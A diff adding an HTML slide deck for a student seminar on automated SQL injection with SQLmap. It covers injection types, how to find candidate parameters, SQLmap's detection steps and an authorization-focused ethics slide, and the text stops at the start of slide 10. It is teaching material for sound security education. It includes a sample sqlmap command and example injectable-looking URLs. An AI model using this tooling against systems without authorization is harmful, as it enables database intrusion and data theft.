@@ -1,0 +1,1581 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="slides-format" content="viewport">
+  <title>Automated SQL Injection using SQLmap</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Inter:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <style type="text/tailwindcss">
+    @theme {
+      --color-bg: #071018;
+      --color-bg-deep: #02070d;
+      --color-surface: #0f1b26;
+      --color-text: #e5fbff;
+      --color-text-secondary: #b8d7df;
+      --color-text-muted: #7b9aaa;
+      --color-accent-1: #00f5d4;
+      --color-accent-2: #39ff14;
+      --color-accent-3: #08b7ff;
+      --color-glass-bg: rgba(10, 22, 30, 0.65);
+      --color-glass-border: rgba(0, 245, 212, 0.16);
+      --color-vignette: rgba(0, 0, 0, 0.48);
+      --font-display: 'JetBrains Mono', monospace;
+      --font-body: 'Inter', sans-serif;
+    }
+  </style>
+  <style>
+    :root {
+      --color-bg: #071018;
+      --color-text: #e5fbff;
+      --glow-color-rgb: 0, 245, 212;
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      background: var(--color-bg);
+      margin: 0;
+    }
+
+    body {
+      font-family: var(--font-body);
+      color: var(--color-text);
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
+    }
+
+    .deck {
+      width: 100vw;
+      height: 100vh;
+      position: relative;
+    }
+
+    .slide {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(180deg, #061018 0%, #07161f 45%, #050c12 100%);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transform: scale(0.97) translateY(8px);
+      filter: blur(2px);
+      transition: opacity 0.7s ease, transform 0.7s ease, filter 0.7s ease;
+      pointer-events: none;
+      overflow: hidden;
+    }
+
+    .slide.active {
+      opacity: 1;
+      transform: scale(1) translateY(0);
+      filter: blur(0);
+      pointer-events: all;
+    }
+
+    .slide>.content {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      max-width: 1180px;
+      padding: clamp(1.5rem, 3.4vw, 3rem);
+    }
+
+    .nav-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      z-index: 100;
+      background: rgba(7, 16, 24, .72);
+      backdrop-filter: blur(10px);
+      padding: 10px 24px;
+      border-radius: 40px;
+      border: 1px solid rgba(0, 245, 212, .16);
+    }
+
+    .nav-btn {
+      width: 40px;
+      height: 40px;
+      border: none;
+      background: rgba(255, 255, 255, .05);
+      color: var(--color-accent-1);
+      border-radius: 50%;
+      font-size: 1.2rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .nav-btn:hover {
+      background: rgba(0, 245, 212, .15);
+      transform: scale(1.12);
+      box-shadow: 0 0 12px rgba(0, 245, 212, .2);
+    }
+
+    .nav-btn:active {
+      transform: scale(0.92);
+      background: rgba(0, 245, 212, .22);
+    }
+
+    .nav-btn:focus-visible {
+      outline: 2px solid var(--color-accent-1);
+      outline-offset: 2px;
+    }
+
+    .slide-dots {
+      display: flex;
+      gap: 8px;
+    }
+
+    .slide-dots .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, .12);
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .slide-dots .dot:hover {
+      background: rgba(0, 245, 212, .4);
+      transform: scale(1.2);
+    }
+
+    .slide-dots .dot.active {
+      background: var(--color-accent-1);
+      transform: scale(1.3);
+      box-shadow: 0 0 8px rgba(0, 245, 212, .4);
+    }
+
+    .slide-counter {
+      font-size: .8rem;
+      color: var(--color-text-muted);
+      min-width: 48px;
+      text-align: center;
+    }
+
+    .reveal {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+
+    .gradient-mesh {
+      position: absolute;
+      inset: 0;
+      z-index: 0;
+      overflow: hidden;
+      pointer-events: none;
+    }
+
+    .blob {
+      position: absolute;
+      border-radius: 50%;
+      filter: blur(85px);
+      animation: float-slow 14s ease-in-out infinite;
+    }
+
+    .blob:nth-child(2) {
+      animation: float-drift 17s ease-in-out infinite;
+    }
+
+    .blob:nth-child(3) {
+      animation: float-slow 20s ease-in-out infinite reverse;
+    }
+
+    .blob:nth-child(4) {
+      animation: float-drift 22s ease-in-out infinite reverse;
+    }
+
+    @keyframes float-slow {
+      0% {
+        transform: translate(0, 0) scale(1);
+      }
+
+      25% {
+        transform: translate(50px, -40px) scale(1.08);
+      }
+
+      50% {
+        transform: translate(-30px, 30px) scale(.94);
+      }
+
+      75% {
+        transform: translate(30px, 15px) scale(1.05);
+      }
+
+      100% {
+        transform: translate(0, 0) scale(1);
+      }
+    }
+
+    @keyframes float-drift {
+      0% {
+        transform: translate(0, 0) scale(1) rotate(0deg);
+      }
+
+      33% {
+        transform: translate(-40px, -45px) scale(1.12) rotate(3deg);
+      }
+
+      66% {
+        transform: translate(35px, 25px) scale(.9) rotate(-2deg);
+      }
+
+      100% {
+        transform: translate(0, 0) scale(1) rotate(0deg);
+      }
+    }
+
+    @keyframes pulse-border {
+
+      0%,
+      100% {
+        box-shadow: 0 0 0 rgba(0, 245, 212, 0);
+      }
+
+      50% {
+        box-shadow: 0 0 24px rgba(0, 245, 212, .18);
+      }
+    }
+
+    @keyframes scan {
+      0% {
+        transform: translateY(-100%);
+      }
+
+      100% {
+        transform: translateY(100%);
+      }
+    }
+
+    @keyframes float {
+
+      0%,
+      100% {
+        transform: translateY(0);
+      }
+
+      50% {
+        transform: translateY(-12px);
+      }
+    }
+
+    .slide::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      z-index: 1;
+      pointer-events: none;
+      background-image: linear-gradient(rgba(0, 255, 65, .035) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 183, 255, .03) 1px, transparent 1px);
+      background-size: 100% 34px, 34px 100%;
+      opacity: .28;
+    }
+
+    .slide::after {
+      content: '';
+      position: absolute;
+      inset: 0;
+      z-index: 1;
+      pointer-events: none;
+      background: radial-gradient(ellipse at center, transparent 50%, var(--color-vignette) 100%);
+    }
+
+    .section-label {
+      letter-spacing: .22em;
+      text-transform: uppercase;
+      color: var(--color-accent-1);
+      font-size: .75rem;
+    }
+
+    .headline {
+      font-family: var(--font-display);
+      letter-spacing: -.04em;
+    }
+
+    .panel {
+      background: var(--color-glass-bg);
+      border: 1px solid var(--color-glass-border);
+      backdrop-filter: blur(14px);
+      border-radius: 22px;
+    }
+
+    .footer {
+      position: absolute;
+      left: 32px;
+      bottom: 20px;
+      z-index: 3;
+      font-size: .78rem;
+      color: #87aab7;
+      letter-spacing: .04em;
+    }
+
+    .terminal {
+      background: #071116;
+      border: 1px solid rgba(57, 255, 20, .22);
+      border-radius: 18px;
+      padding: 18px 20px;
+      box-shadow: inset 0 0 0 1px rgba(255, 255, 255, .02);
+    }
+
+    .terminal.has-titlebar {
+      padding-top: 0;
+    }
+
+    .terminal-titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px 8px;
+      border-bottom: 1px solid rgba(255, 255, 255, .06);
+      margin-bottom: 12px;
+    }
+
+    .terminal-dots {
+      display: flex;
+      gap: 6px;
+    }
+
+    .terminal-dots span {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .terminal-dots span:nth-child(1) {
+      background: #ff5f57;
+    }
+
+    .terminal-dots span:nth-child(2) {
+      background: #febc2e;
+    }
+
+    .terminal-dots span:nth-child(3) {
+      background: #28c840;
+    }
+
+    .terminal-title {
+      font-family: var(--font-display);
+      font-size: .75rem;
+      color: #7b9aaa;
+      margin-left: 8px;
+    }
+
+    .terminal .prompt {
+      color: #39ff14;
+      font-family: var(--font-display);
+    }
+
+    .terminal .prompt-user {
+      color: #08b7ff;
+      font-family: var(--font-display);
+    }
+
+    .terminal .prompt-path {
+      color: #b8d7df;
+      font-family: var(--font-display);
+    }
+
+    .terminal .prompt-hash {
+      color: #39ff14;
+      font-family: var(--font-display);
+    }
+
+    .terminal-output {
+      font-family: var(--font-display);
+      font-size: .92rem;
+      line-height: 1.55;
+      color: #8fb8c4;
+      margin-top: 10px;
+      border-top: 1px solid rgba(255, 255, 255, .05);
+      padding-top: 10px;
+    }
+
+    .terminal-output .info {
+      color: #08b7ff;
+    }
+
+    .terminal-output .result {
+      color: #39ff14;
+    }
+
+    .terminal-output .warn {
+      color: #febc2e;
+    }
+
+    .codebig {
+      font-family: var(--font-display);
+      font-size: 1.15rem;
+      line-height: 1.6;
+      color: #dcfff6;
+      word-break: break-word;
+    }
+
+    .mini {
+      font-size: .9rem;
+      color: var(--color-text-secondary);
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid rgba(0, 245, 212, .18);
+      background: rgba(0, 245, 212, .07);
+      padding: 8px 14px;
+      border-radius: 999px;
+      color: #bffef2;
+      font-size: .85rem;
+    }
+
+    .flow-arrow {
+      font-size: 1.6rem;
+      color: #39ff14;
+      align-self: center;
+    }
+
+    .matrix-card {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .matrix-card::after {
+      content: '';
+      position: absolute;
+      inset: auto 0 0 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, rgba(0, 245, 212, .9), transparent);
+      animation: pulse-border 3s ease-in-out infinite;
+    }
+
+    .scanline {
+      position: relative;
+      overflow: hidden;
+    }
+
+    .scanline::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(to bottom, transparent 0%, rgba(0, 245, 212, .08) 50%, transparent 100%);
+      transform: translateY(-100%);
+      animation: scan 4.5s linear infinite;
+      pointer-events: none;
+    }
+
+    .param-chip {
+      border: 1px solid rgba(8, 183, 255, .2);
+      background: rgba(8, 183, 255, .08);
+      border-radius: 12px;
+      padding: 10px 12px;
+      font-family: var(--font-display);
+      color: #ccf5ff;
+    }
+
+    .notes {
+      display: none;
+    }
+
+    .panel ul li::marker {
+      color: var(--color-accent-1);
+    }
+
+    .panel ul li {
+      padding-left: 4px;
+    }
+
+    .panel:not(.matrix-card):hover {
+      border-color: rgba(0, 245, 212, .28);
+      box-shadow: 0 0 16px rgba(0, 245, 212, .06);
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    /* Auto-play progress bar */
+    .autoplay-progress {
+      position: fixed;
+      top: 0;
+      left: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--color-accent-1), var(--color-accent-2));
+      z-index: 200;
+      width: 0%;
+      transition: none;
+      box-shadow: 0 0 8px rgba(0, 245, 212, .4);
+    }
+
+    .autoplay-progress.running {
+      animation: progress-fill var(--autoplay-duration, 10s) linear forwards;
+    }
+
+    .autoplay-progress.paused {
+      animation-play-state: paused;
+    }
+
+    @keyframes progress-fill {
+      0% {
+        width: 0%;
+      }
+
+      100% {
+        width: 100%;
+      }
+    }
+
+    .autoplay-btn {
+      width: 36px;
+      height: 36px;
+      border: none;
+      background: rgba(255, 255, 255, .05);
+      color: var(--color-accent-2);
+      border-radius: 50%;
+      font-size: 1rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
+      margin-left: 4px;
+    }
+
+    .autoplay-btn:hover {
+      background: rgba(57, 255, 20, .15);
+      transform: scale(1.12);
+      box-shadow: 0 0 12px rgba(57, 255, 20, .2);
+    }
+
+    .autoplay-btn:active {
+      transform: scale(0.92);
+    }
+
+    .autoplay-btn.active {
+      background: rgba(57, 255, 20, .18);
+      color: #39ff14;
+      box-shadow: 0 0 10px rgba(57, 255, 20, .25);
+    }
+
+    @media print {
+
+      .nav-controls,
+      .mouse-spotlight,
+      .autoplay-progress {
+        display: none !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="mouse-spotlight" style="position:fixed;inset:0;z-index:99;pointer-events:none;"></div>
+  <div class="deck">
+
+    <div class="slide active" data-slide="1">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:520px;height:520px;top:-100px;right:-110px;background:#00f5d4;opacity:.12"></div>
+        <div class="blob" style="width:300px;height:300px;bottom:-70px;left:-50px;background:#39ff14;opacity:.10"></div>
+        <div class="blob" style="width:260px;height:260px;top:34%;left:16%;background:#08b7ff;opacity:.10"></div>
+        <div class="blob" style="width:180px;height:180px;top:14%;right:22%;background:#39ff14;opacity:.08"></div>
+      </div>
+      <canvas class="particle-canvas" style="position:absolute;inset:0;z-index:1"></canvas>
+      <div class="content text-center">
+        <div class="reveal" style="font-size:100px;animation:float 3s ease-in-out infinite;">🛡️</div>
+        <p class="section-label reveal">Cybersecurity Seminar</p>
+        <h1
+          class="headline reveal text-[clamp(2.2rem,5.2vw,4.8rem)] font-extrabold bg-linear-to-r from-accent-3 via-accent-1 to-accent-2 bg-clip-text text-transparent">
+          Automated SQL Injection using SQLmap</h1>
+        <div class="reveal mt-6 grid grid-cols-1 md:grid-cols-3 gap-4 max-w-4xl mx-auto">
+          <div class="panel p-4">
+            <div class="mini">Presenter</div>
+            <div class="text-xl font-semibold">Anugrah K</div>
+          </div>
+          <div class="panel p-4">
+            <div class="mini">Reg No</div>
+            <div class="text-xl font-semibold">12314674</div>
+          </div>
+          <div class="panel p-4">
+            <div class="mini">Department</div>
+            <div class="text-xl font-semibold">School of Computer Science and Engineering</div>
+          </div>
+        </div>
+        <p class="reveal mt-6 text-text-secondary text-lg">From a single URL to every row in the database.</p>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Introduce the seminar, your identity, and the central idea: SQLmap is not magic. Explain that
+        the talk follows a real pentesting workflow from identifying inputs to testing and only then enumeration.
+        Mention that the seminar is educational and professional in tone.</aside>
+    </div>
+
+    <div class="slide" data-slide="2">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:340px;height:340px;top:-70px;right:-60px;background:#00f5d4;opacity:.08"></div>
+        <div class="blob" style="width:250px;height:250px;bottom:-60px;left:-40px;background:#08b7ff;opacity:.07"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Seminar flow</p>
+        <h2 class="headline reveal text-4xl font-bold mb-8">Roadmap</h2>
+        <div class="reveal grid grid-cols-2 md:grid-cols-4 gap-5">
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">01</div>
+            <div class="font-semibold mt-2">SQL injection basics</div>
+            <div class="mini mt-2">What the flaw is and why it matters.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">02</div>
+            <div class="font-semibold mt-2">What is SQLmap</div>
+            <div class="mini mt-2">Tool overview, capabilities, and workflow.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">03</div>
+            <div class="font-semibold mt-2">Reality check</div>
+            <div class="mini mt-2">Most sites are not vulnerable and random URLs are not enough.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">04</div>
+            <div class="font-semibold mt-2">Finding inputs</div>
+            <div class="mini mt-2">Parameters, forms, filters, POST bodies, and API requests.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">05</div>
+            <div class="font-semibold mt-2">Detection &amp; ethics</div>
+            <div class="mini mt-2">How SQLmap tests parameters and why authorization matters.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">06</div>
+            <div class="font-semibold mt-2">Command workflow</div>
+            <div class="mini mt-2">Detect, enumerate DBs, tables, columns, then dump if authorized.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">07</div>
+            <div class="font-semibold mt-2">Advanced options</div>
+            <div class="mini mt-2">POST data, cookies, batch mode, risk and level.</div>
+          </div>
+          <div class="panel p-5 matrix-card">
+            <div class="text-accent-1 font-display text-2xl">08</div>
+            <div class="font-semibold mt-2">Defense &amp; prevention</div>
+            <div class="mini mt-2">Limitations, parameterized queries, and secure coding.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Walk the audience through the agenda like a map. Emphasize that the flow intentionally starts
+        with finding input points, because that is where beginner confusion often begins.</aside>
+    </div>
+
+    <div class="slide" data-slide="3">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:320px;height:320px;top:-80px;left:-60px;background:#08b7ff;opacity:.08"></div>
+        <div class="blob" style="width:230px;height:230px;bottom:-50px;right:-30px;background:#39ff14;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Concept</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">What is SQL Injection?</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-7 items-center">
+          <div class="panel p-6 reveal">
+            <p class="text-lg text-text-secondary">A web application becomes vulnerable when untrusted input changes the
+              SQL query sent to the database. Instead of remaining only data, the input influences query logic,
+              filtering, or execution.</p>
+            <ul class="mt-4 space-y-3 text-lg">
+              <li class="reveal">Authentication bypass</li>
+              <li class="reveal">Unauthorized data access</li>
+              <li class="reveal">Data leakage or modification</li>
+            </ul>
+          </div>
+          <div class="terminal has-titlebar scanline reveal">
+            <div class="terminal-titlebar">
+              <div class="terminal-dots"><span></span><span></span><span></span></div>
+              <div class="terminal-title">mysql&gt;</div>
+            </div>
+            <div class="mini mb-2">Simple vulnerable idea</div>
+            <div class="codebig">SELECT * FROM users<br>WHERE username = '&lt;input&gt;'<br>AND password =
+              '&lt;input&gt;';</div>
+            <div class="mini mt-4">If the application builds this query unsafely, attacker-controlled input may change
+              the intended SQL behavior.</div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Keep this slide conceptual. Do not overcomplicate syntax. The audience only needs the core
+        mental model: unsafe input reaches a SQL query and changes behavior.</aside>
+    </div>
+
+
+    <div class="slide" data-slide="4">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:340px;height:340px;top:-80px;right:-50px;background:#39ff14;opacity:.08"></div>
+        <div class="blob" style="width:250px;height:250px;bottom:-70px;left:-40px;background:#08b7ff;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Classification</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Types of SQL Injection</h2>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-5">
+          <div class="panel p-5 matrix-card reveal">
+            <div class="text-accent-1 font-display text-lg mb-2">In-Band (Classic)</div>
+            <div class="font-semibold">Error-based</div>
+            <div class="mini mt-1">Forces SQL errors that reveal database information in the page response.</div>
+            <div class="font-semibold mt-3">UNION-based</div>
+            <div class="mini mt-1">Appends UNION SELECT to combine attacker queries with the original result set.</div>
+          </div>
+          <div class="panel p-5 matrix-card reveal">
+            <div class="text-accent-2 font-display text-lg mb-2">Inferential (Blind)</div>
+            <div class="font-semibold">Boolean-based</div>
+            <div class="mini mt-1">Sends true/false conditions and observes content differences in the response.</div>
+            <div class="font-semibold mt-3">Time-based</div>
+            <div class="mini mt-1">Injects SLEEP or BENCHMARK and measures response delay to infer data.</div>
+          </div>
+          <div class="panel p-5 matrix-card reveal">
+            <div class="text-accent-3 font-display text-lg mb-2">Advanced</div>
+            <div class="font-semibold">Stacked queries</div>
+            <div class="mini mt-1">Terminates the original query and appends entirely new SQL statements.</div>
+            <div class="font-semibold mt-3">Out-of-band (OOB)</div>
+            <div class="mini mt-1">Triggers DNS or HTTP requests to an external server controlled by the tester.</div>
+          </div>
+        </div>
+        <p class="reveal mt-5 text-text-secondary">SQLmap automatically tests all applicable techniques against each
+          parameter.</p>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Walk through each type briefly. Emphasize that SQLmap handles all these internally. The
+        audience does not need to memorize payload syntax, but should understand the categories.</aside>
+    </div>
+
+    <div class="slide" data-slide="5">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:300px;height:300px;top:-70px;right:-40px;background:#08b7ff;opacity:.08"></div>
+        <div class="blob" style="width:260px;height:260px;bottom:-60px;left:-50px;background:#00f5d4;opacity:.06"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Tool overview</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">What is SQLmap?</h2>
+        <div class="grid grid-cols-1 md:grid-cols-[1fr_1fr] gap-6 items-center">
+          <div class="panel p-6 reveal">
+            <p class="text-lg text-text-secondary">SQLmap is an open-source penetration testing tool that automates SQL
+              injection detection and, after confirmation, supports database enumeration in authorized environments.</p>
+            <div class="grid grid-cols-2 gap-4 mt-5">
+              <div class="panel p-4">Detect SQL injection</div>
+              <div class="panel p-4">Enumerate databases</div>
+              <div class="panel p-4">Discover tables</div>
+              <div class="panel p-4">Discover columns</div>
+              <div class="panel p-4 col-span-2">Extract data only when the engagement scope permits it</div>
+            </div>
+          </div>
+          <div class="panel p-6 reveal">
+            <div class="font-semibold mb-4">Workflow infographic</div>
+            <div class="grid gap-3">
+              <div class="panel p-4">Input point</div>
+              <div class="flow-arrow">↓</div>
+              <div class="panel p-4">Detection engine</div>
+              <div class="flow-arrow">↓</div>
+              <div class="panel p-4">Injection confirmed</div>
+              <div class="flow-arrow">↓</div>
+              <div class="panel p-4">Enumeration modules</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Frame SQLmap as automation built on testing logic, not as a miracle exploit button. This
+        prepares the audience for the practical command slides.</aside>
+    </div>
+
+    <div class="slide" data-slide="6">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:360px;height:360px;top:-90px;right:-70px;background:#39ff14;opacity:.08"></div>
+        <div class="blob" style="width:240px;height:240px;bottom:-70px;left:-50px;background:#00f5d4;opacity:.05"></div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Critical mindset</p>
+        <h2 class="headline reveal text-4xl font-bold mb-8">Reality Check: Not Every Website Is Vulnerable</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div class="panel p-6 reveal border border-red-500/20">
+            <div class="text-red-300 font-semibold mb-3">Wrong expectation</div>
+            <div class="terminal has-titlebar">
+              <div class="terminal-titlebar">
+                <div class="terminal-dots"><span></span><span></span><span></span></div>
+                <div class="terminal-title">anugrah@kali:~</div>
+              </div>
+              <div class="codebig"><span class="prompt-user">anugrah@kali</span><span class="prompt-path">:~</span><span
+                  class="prompt-hash"># </span>sqlmap -u "https://abcd.com"</div>
+            </div>
+            <p class="mini mt-4">A random homepage without a testable parameter gives SQLmap little context. No useful
+              input point means weak or no SQLi test path.</p>
+          </div>
+          <div class="panel p-6 reveal border border-emerald-400/20">
+            <div class="text-emerald-300 font-semibold mb-3">Better starting point</div>
+            <div class="space-y-3">
+              <div class="param-chip">https://site.com/item.php?id=1</div>
+              <div class="param-chip">https://site.com/listproducts.php?cat=1</div>
+              <div class="param-chip">https://site.com/view.php?product=5</div>
+              <div class="param-chip">https://site.com/search.php?search=laptop</div>
+            </div>
+            <p class="mini mt-4">These parameters are not automatically vulnerable, but they are visible places where
+              user input may enter a backend query.</p>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">This is one of the most important slides. State directly that SQLmap does not dump random
+        sites. A tester must first identify a candidate parameter or request field worth testing.</aside>
+    </div>
+
+    <div class="slide" data-slide="7">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:310px;height:310px;top:-70px;left:-50px;background:#00f5d4;opacity:.08"></div>
+        <div class="blob" style="width:220px;height:220px;bottom:-60px;right:-50px;background:#08b7ff;opacity:.07">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Recon to input points</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">How Do We Find a Possible Vulnerable URL or Parameter?</h2>
+        <div class="grid grid-cols-1 md:grid-cols-[1.1fr_.9fr] gap-6 items-center">
+          <div class="grid grid-cols-2 gap-4 reveal">
+            <div class="panel p-5">
+              <div class="font-semibold">URL parameters</div>
+              <div class="mini mt-2">?id=1, ?cat=2, ?page=3</div>
+            </div>
+            <div class="panel p-5">
+              <div class="font-semibold">Search bars</div>
+              <div class="mini mt-2">?search=phone</div>
+            </div>
+            <div class="panel p-5">
+              <div class="font-semibold">Login and forms</div>
+              <div class="mini mt-2">Username, password, filters</div>
+            </div>
+            <div class="panel p-5">
+              <div class="font-semibold">POST requests</div>
+              <div class="mini mt-2">Form bodies and hidden fields</div>
+            </div>
+            <div class="panel p-5">
+              <div class="font-semibold">API requests</div>
+              <div class="mini mt-2">JSON keys, IDs, query params</div>
+            </div>
+            <div class="panel p-5">
+              <div class="font-semibold">Cookies and headers</div>
+              <div class="mini mt-2">Sometimes evaluated server-side</div>
+            </div>
+          </div>
+          <div class="reveal panel p-6">
+            <div class="font-semibold mb-4">Visual logic</div>
+            <div class="grid grid-cols-1 gap-3 text-center">
+              <div class="panel p-4">Web page or app input</div>
+              <div class="flow-arrow">↓</div>
+              <div class="panel p-4">HTTP request with parameter</div>
+              <div class="flow-arrow">↓</div>
+              <div class="panel p-4">Server-side query building</div>
+              <div class="flow-arrow">↓</div>
+              <div class="panel p-4">Database interaction</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Explain that testers inspect requests, forms, and application behavior. Mention proxies such
+        as Burp Suite conceptually without turning the talk into a Burp tutorial. The goal is to show where SQLmap gets
+        its starting point.</aside>
+    </div>
+
+    <div class="slide" data-slide="8">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:330px;height:330px;top:-70px;left:-60px;background:#00f5d4;opacity:.08"></div>
+        <div class="blob" style="width:230px;height:230px;bottom:-60px;right:-50px;background:#39ff14;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Detection logic</p>
+        <h2 class="headline reveal text-4xl font-bold mb-8">How SQLmap Finds a Vulnerable Parameter</h2>
+        <div class="grid grid-cols-5 gap-3 items-center reveal">
+          <div class="panel p-4 text-center">
+            <div class="font-semibold">1</div>
+            <div class="mini mt-2">Find parameter</div>
+          </div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">
+            <div class="font-semibold">2</div>
+            <div class="mini mt-2">Send test payloads</div>
+          </div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">
+            <div class="font-semibold">3</div>
+            <div class="mini mt-2">Compare responses</div>
+          </div>
+        </div>
+        <div class="grid grid-cols-5 gap-3 items-center reveal mt-4">
+          <div class="panel p-4 text-center">
+            <div class="font-semibold">4</div>
+            <div class="mini mt-2">Look for SQL behavior</div>
+          </div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">
+            <div class="font-semibold">5</div>
+            <div class="mini mt-2">Confirm or reject</div>
+          </div>
+          <div class="flow-arrow">→</div>
+          <div class="panel p-4 text-center">
+            <div class="font-semibold">Next</div>
+            <div class="mini mt-2">Enumeration only if confirmed</div>
+          </div>
+        </div>
+        <div class="terminal reveal mt-8">
+          <div class="mini mb-2">Possible signals</div>
+          <div class="codebig">• SQL error messages<br>• Different page content for true/false conditions<br>•
+            Noticeable delay during time-based tests<br>• Changed row count or application behavior</div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Explain that SQLmap is effectively performing controlled experiments. It changes one thing,
+        observes the application, and decides whether the parameter is injectable.</aside>
+    </div>
+
+    <div class="slide" data-slide="9">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:340px;height:340px;top:-80px;left:-70px;background:#39ff14;opacity:.07"></div>
+        <div class="blob" style="width:220px;height:220px;bottom:-50px;right:-40px;background:#08b7ff;opacity:.06">
+        </div>
+      </div>
+      <div class="content">
+        <p class="section-label reveal">Professional conduct</p>
+        <h2 class="headline reveal text-4xl font-bold mb-6">Ethical &amp; Authorized Testing</h2>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+          <div class="panel p-6 reveal">
+            <ul class="space-y-4 text-lg">
+              <li>Written authorization is mandatory.</li>
+              <li>Testing must remain inside the approved scope.</li>
+              <li>Rules of engagement, timing, and communication matter.</li>
+              <li>Findings and evidence should be handled confidentially.</li>
+              <li>Professional reporting is part of the job, not an afterthought.</li>
+            </ul>
+          </div>
+          <div class="panel p-6 reveal">
+            <div class="badge">Demo target: http://testphp.vulnweb.com</div>
+            <div class="terminal mt-5">
+              <div class="codebig">FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY</div>
+            </div>
+            <p class="mini mt-4">Use this seminar to understand workflow, not to attack systems without permission.</p>
+          </div>
+        </div>
+      </div>
+      <div class="footer">Anugrah K | Reg No: 12314674</div>
+      <aside class="notes">Tie this slide to the CompTIA mindset: authorization, scope, rules of engagement,
+        confidentiality, and reporting. Make the legal boundary very explicit.</aside>
+    </div>
+
+    <div class="slide" data-slide="10">
+      <div class="gradient-mesh">
+        <div class="blob" style="width:320px;height:320px;top:-60px;right:-50px;background:#00f5d4;opacity:.08"></div>
